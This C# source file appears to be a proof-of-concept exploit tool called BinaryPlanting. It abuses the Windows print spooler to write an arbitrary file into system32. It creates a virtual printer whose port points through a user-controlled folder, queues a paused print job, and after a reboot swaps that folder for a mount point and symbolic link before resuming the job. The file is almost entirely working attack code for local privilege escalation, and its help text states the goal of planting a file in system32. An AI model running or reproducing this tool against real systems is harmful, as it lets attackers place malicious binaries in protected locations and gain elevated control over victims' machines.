using System;
using System.IO;
using NtApiDotNet;

namespace BinaryPlanting
{
    class Program
    {
        static public void Main(string[] args)
        {
            string userprofile = Environment.GetEnvironmentVariable("userprofile");
            string mountpointname = $@"{userprofile}\virtualprinter";
            string dstsymlinkname = "dllpointer";

            string printerName = "VirtualPrinter";
            string portName = $@"{userprofile}\{printerName}\{dstsymlinkname}";
            string driverName = "Generic / Text Only";
            
            bool bRes;

            if (args.Length < 2 || args.Length > 2)
            {
                ShowHelp();
                return;
            }

            switch (args[0].ToUpper())
            {
                case "INIT":

                    bRes = File.Exists(args[1]);
                    if (bRes == false)
                    {
                        Console.WriteLine("[-] {0} file not found", args[1]);
                        return;
                    }

                    if (!Directory.Exists(mountpointname))
                        Directory.CreateDirectory(mountpointname);

                    bRes = Printer.NewPrinter(printerName, portName, driverName);
                    if (bRes == false) return;
                    Console.WriteLine("[+] {0} created", printerName);

                    bRes = Printer.PausePrinter(printerName);
                    if (bRes == false) return;
                    Console.WriteLine("[+] {0} paused", printerName);

                    bRes = Printer.PrintDocument(printerName, args[1]);
                    if (bRes == false) return;
                    Console.WriteLine("[+] Document sent to {0}", printerName);

                    Console.WriteLine("[+] Manually reboot the system");

                    break;

                case "RESUME":

                    Utils.MakeMountPoint(mountpointname);
                    Console.WriteLine("[+] MountPoint created");

                    bRes = Utils.MakePermanentSymLink(dstsymlinkname, args[1]);
                    if (bRes == false) return;
                    Console.WriteLine("[+] SymLink created");

                    bRes = Printer.ResumePrinter(printerName);
                    if (bRes == false) return;
                    Console.WriteLine("[+] {0} state changed to online", printerName);

                    Console.WriteLine("[+] Done! Check on system32 if it's OK");

                    break;

                default:
                    ShowHelp();
                    break;
            }

            return;
        }

        static public void ShowHelp()
        {
            Console.WriteLine("Binary planting inputfile on system32 as outputfile.\n");
            Console.WriteLine("- [Step1]: BinaryPlanting.exe init inputfilename");
            Console.WriteLine("- Manually reboot the system.");
            Console.WriteLine("- [Step2]: BinaryPlanting.exe resume outputfilename\n");
        }
    }
}
